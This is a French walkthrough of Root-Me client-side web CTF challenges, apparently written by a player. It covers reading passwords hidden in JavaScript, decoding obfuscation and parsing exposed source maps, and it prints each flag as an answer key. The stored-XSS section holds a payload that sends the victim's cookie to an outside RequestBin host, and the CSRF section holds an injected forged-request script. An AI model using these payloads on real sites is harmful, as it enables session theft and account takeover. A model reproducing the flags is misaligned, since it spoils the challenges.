# Web - Client
Apprenez à exploiter les failles des applications web pour impacter leurs utilisateurs ou contourner des mécanismes de sécurité côté client.

Cette série d’épreuves vous confronte à l’utilisation de langage de script/programmation côté client. Ce sont principalement des scripts à analyser et à comprendre, pour en trouver des vulnérabilités exploitables. Cela permet aussi de se familiariser avec ces langages, dont l’utilisation est très répandue sur Internet.

## Prérequis :
 - Maîtriser un langage de script "web côté client", par exemple JavaScript.
 - Maîtriser le fonctionnement d’un débogueur, par exemple Firebug / console JavaScript.

---

# 42 Challenges
## 1. HTML - boutons désactivés

Avec `curl` on obtient le flag :
```bash
curl -X POST "http://challenge01.root-me.org/web-client/ch25/" -F "auth-login=ark" -F "authbutton='Member access'"
```
```html
<div class='success'>Member access granted! The validation password is HTMLCantStopYou</div>
```
Flag : **HTMLCantStopYou**

## 2. JavaScript - Authentification

### Solution :
1. Clic droit > "Examiner l'élément".
2. Onglet "Débogueur" > sources "web-client/ch9".
3. Ouvrir `login.js` et repérer :
```js
if (pseudo=="4dm1n" && password=="sh.org")
```
Le flag est **sh.org**.

## 3. JavaScript - Source

Faire un `console.log(login)` pour obtenir :
```js
if (pass == "123456azerty") {
    alert("Mot de passe accepté...");
}
```
Le flag est **123456azerty**.

## 4. JavaScript - Authentification 2

Analyser le code source :
```js
var TheLists = ["GOD:HIDDEN"];
```
Le flag est **HIDDEN**.

## 5. JavaScript - Obfuscation 1

Regarder les sources :
```js
pass = '%63%70%61%73%62%69%65%6e%64%75%72%70%61%73%73%77%6f%72%64';
alert(unescape(pass));
```
Le flag est **cpasbiendurpassword**.

## 6. JavaScript - Obfuscation 2

Utiliser `unescape()` et `String.fromCharCode()` :
```js
console.log(String.fromCharCode(104,68,117,102,106,100,107,105,49,53,54));
```
Le flag est **hDufjdki156**.

## 7. JavaScript - Native code

Regarder le prompt :
```js
if(a=='toto123lol')
```
Le flag est **toto123lol**.

## 8. JavaScript - Webpack

En analysant les fichiers JS, on observe un commentaire à la fin qui nous donne l'URL du mapping du code source :
```js
//# sourceMappingURL=app.a92c5074dafac0cb6365...
```
---

on load ce fichier en se rendant a l’url suivante : http://challenge01.root-me.org/web-client/ch27/static/js/app.a92c5074dafac0cb6365.js.map
Ou bien en CLI avec wget

    wget 'http://challenge01.root-me.org/web-client/ch27/static/js/app.a92c5074dafac0cb6365.js.map'

On observe que le fichier a bien été téléchargé ce qui signifie que les sources map n’ont pas été désactivées lors de la mise en production.

À partir de là, il ne nous reste plus qu’à parser le .map avec source-map-parser. (https://github.com/unisil/source-map-parser)
```
python source-map-parser.py -f ~/Root-Me/Webpack/app.a92c5074dafac0cb6365.js.map -d ~/Root-Me/Webpack/  
```
On peut aussi simplement load le .map via son url :

    python source-map-parser.py -u 'http://challenge01.root-me.org/web-client/ch27/static/js/app.a92c5074dafac0cb6365.js.map' -d ~/Root-Me/Webpack/

Une fois que l’on a récupéré les sources, on va grep (rechercher) le mot ’flag’ dans les fichiers.

```    grep -Ri 'flag'
    components/YouWillNotFindThisRouteBecauseItIsHidden.vue:        
	// Here is your 	
	flag : BecauseSourceMapsAreGreatForDebuggingButNotForProduction
```
---
## 9. Javascript - Obfuscation 3

Tout d’abord il faut analyser le code source pour voir les fonctions JS disponible :
On observe un appel à la fonction dechiffre() avec en paramètre une chaine en ASCII et le tout est passé en paramètre à la fonction fromCharCode() :

    String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));

Lorsqu’on décode pas à pas la chaine ASCII cela donne :

\x35 = 5 en decimal
Donc \x35\x35\x2c = "55," et String.fromCharCode(55) ; = 7

En continuant sur cette logique on obtient la chaine suivante :
"55,56,54,79,115,69,114,116,107,49,50"

En calculant :

    String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50);

On obtient "786OsErtk12" qui est le password du challenge.

---
## 10. XSS - Stockée 1

Une solution alternative aux autres car ne nécessitant pas de créer un script de réception ni de créer un serveur.
Le cookie est récupéré directement dans l’url qu’on construit.

Il suffit d’aller sur le site RequestBin et de faire Create a RequestBin (gratuit).

On utilisera le lien de l’encadré pour l’attaque XSS. Le lien a la forme suivante : http://requestb.in/xxxxxxxx

Dans le formulaire du challenge on met n’importe quelle valeur pour le titre et pour le message le script suivant :
```
<script>document.write('<IMG SRC=\"http://requestb.in/xxxxxxxx?cookie='+document.cookie+'\">Hacked</IMG>');
</script>
```
On devrait voir apparaître notre requête sur l’url RequestBin qu’on a créé.
Puis après quelques minutes (messages lus par l’admin) on verra apparaître la requête faite par l’admin (penser à rafraîchir la page) :
http://requestb.in
GET /xxxxxxxx?cookie=(u'ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6',)

Le cookie pour validation est donc : `NkI9qe4cdLIO2P7MIsWS8ofD6`

## 14. CSRF - 0 protection

L’accès à la partie private du site nous est refusé car notre compte doit être validé par un administrateur. On va donc chercher à atteindre cette validation. Pour cela, on note que :

    La page pour contacter un administrateur est vulnérable aux attaques XSS
    La requête envoyée lors de la validation est une requête POST accompagnée des données username=tonpseudo et status=on (checkbox cochée)

Une solution est d’injecter dans le formulaire de contact un script. Ce script va forcer l’administrateur à envoyer une requête qui validera notre compte. La requête venant de l’administrateur, le serveur la considèrera comme légitime.
```
<script>
         var post_data = 'username=aaaa&status=on';
         var xmlhttp = new XMLHttpRequest();
         xmlhttp.open("POST", "http://challenge01.root-me.org/web-client/ch22/index.php?action=profile", true);
         xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         xmlhttp.send(post_data);
    </script>


Notre attaque CSRF est un succès !
Good job dude, flag is : Csrf_[...]3l1 !
```